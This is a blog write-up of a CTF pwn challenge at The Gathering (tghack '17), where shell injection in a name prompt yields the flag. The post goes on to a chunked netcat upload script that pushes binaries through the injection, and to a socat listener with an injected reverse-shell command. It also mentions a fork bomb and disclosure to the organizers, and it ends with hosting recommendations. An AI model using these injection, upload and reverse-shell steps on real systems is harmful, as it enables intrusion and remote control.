---
layout: post
title: "Investigating the ctf infrastructure at The Gathering"
author: capitol
category: ctf
---
![bits](/images/time.jpg)

##### name:
Time

##### category:
pwn

##### points:
80

#### Writeup

The biggest lan party here in norway is The Gathering, and they also organize a small
ctf, tghack.

The Time challenge presented us with a prompt for our name, and then printed that name
and the current time.

The server side code did this by running a shell command, and the input wasn't 
sanitized.

We got the flag by entering $(cat flag.txt) as the name. It was TG17{tick_t0ck_arbitrary_c0de_execution}.

But then we looked around some more, and discovered that /tmp was writeable and
executable, and gcc was also installed. A peek at the files in /etc confirmed our guess
that it ran as a docker image.

Someone also entered a fork bomb into the challenge, and that confirmed that many of the
challenges ran on the same host, as the organizers hadn't set any limit or cgroup rules.

At this point we decided it was time to do some responsible disclosure to the 
organizers. As it might have been possible to MITM the network traffic to the other
challenges with an arp poison attack, as described
 [here](https://nyantec.com/en/2015/03/20/docker-networking-considered-harmful/).

That done we wrote a small program to upload our binaries to /tmp/

```bash
#!/bin/bash
# made for tghack '17
# desc: upload a file chunked through a shell with length
#       restrictions of commands. you might need to manually
#       tune the BUFLEN to stay within the limits. sh syntax
#       errors appears when you're out of bounds.
#
# todo: progress bar
#
HOST=${1}
PORT=${2}
FILE=${3}
DEST=${4:-"/tmp/$$"}

if [[ -z "$HOST" || -z "$PORT" || -z "$FILE" || -z "$DEST" ]]; then
  >&2 echo "Missing argument(s). Usage: program <host> <port> <file> [<dest>]"
  exit 2
fi

# Compress file and remove newlines to make it easy to echo
COMPRESSED="$(gzip -c $FILE | base64 | tr -d '\n')"

SIZE=${#COMPRESSED}
BUFLEN=33
INDEX=0

NETCAT="nc -q 0 $HOST $PORT"

# Upload file
while [ $INDEX -le $SIZE ]; do
  SUBSTR=${COMPRESSED:$INDEX:$BUFLEN}

  # Pipe chunk through netcat and append to destination file
  # \x60 is a backtick
  printf '\x60echo \x27%b\x27>>%b\x60' "$SUBSTR" "$DEST" | $NETCAT

  INDEX=$(( $INDEX + $BUFLEN ))
done

# Decompress and make executable
printf '\x60cat %b|base64 -d|zcat>%b.sh\x60' $DEST $DEST | $NETCAT
printf '\x60chmod +x %b.sh\x60' $DEST | $NETCAT

echo "Executable at $DEST.sh"
```

Some more exploring reveled that they hadn't blocked outgoing connections from the
docker image, so we uploaded a reverse shell and on our server we did:

```bash
socat -,raw,echo=0 tcp-listen:14243
```

and executed the shell with:
```bash
echo '$(/tmp/c <serverip> 14243)' | nc time.tghack.no 1111
```

This made it a lot easier to explore the system, unfortunately other obligations came
up, so we didn't manage to find any other vulnerabilities.

Our recommendations for hosting challenges are these:
1. Set limits on the amount of resources each challenge can consume, so that a problem
with one challenge doesn't block people from using the other challenges.
2. Lock down the file system if it's not part of the challenge to gain a shell, no
need to have any of it writeable.
3. Letting people send network traffic out might not be the best thing, no need to be
a jump host in real attacks.

We would also like to give credit to the organizers of the ctf, for building a lot
of nice challenges that did a great job of teaching those that are new to the hobby.
They were also very responsive when we reported problems to them.
